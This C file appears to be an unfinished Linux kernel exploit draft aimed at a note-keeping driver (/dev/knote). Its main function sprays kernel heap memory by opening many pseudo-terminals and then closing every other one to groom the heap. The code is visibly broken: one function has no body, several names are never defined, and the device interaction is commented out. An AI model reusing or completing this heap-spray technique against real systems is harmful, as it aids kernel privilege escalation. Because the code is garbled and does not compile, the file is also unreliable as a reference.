#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pty.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define SPRAY_NOTE_NUM 10000

unsigned long add_note(int fd, unsigned long year, unsigned long month, unsigned long day,
		unsigned long h, unsigned long m, unsigned long s,
		void *buf, unsigned long size) {
	struct note_io_t io;
	io.date.year = year;
	io.date.month = month;
	io.date.day = day;
	io.date.h = h;
	io.date.m = m;
	io.date.s = s;
	io.buf_size = size;
	io.buf = buf;

	magic = ioctl(fd, NOTE_ADD, &io);
	if (magic < 0)
		printf("[-] add note failed\n");
}

void delete_note
int main()
{
	int i, j;
	int fd;
	int m_fd[ALLOC_NUM], s_fd[ALLOC_NUM];

	puts("[+] let's start :)");

	/* tty spraying */
	for (i = 0; i < ALLOC_NUM; ++i) {
		if (openpty(&m_fd[i], &s_fd[i], NULL, NULL, NULL) == -1) {
			puts("[-] pty creation failed");
		}
	}

	for (i = 0; i < ALLOC_NUM; ++i) {
		if (i % 2 == 1) {
			close(m_fd[i]);
			close(s_fd[i]);
		}
	}

	// close(m_fd[64]);
	// close(s_fd[64]);

	/*
	fd = open("/dev/knote", O_RDWR);
	if (fd < 0) {
		puts("[-] device open failed");
	}	

	ioctl(fd, 0, NULL);
	*/

	getchar();

	return 0;
}


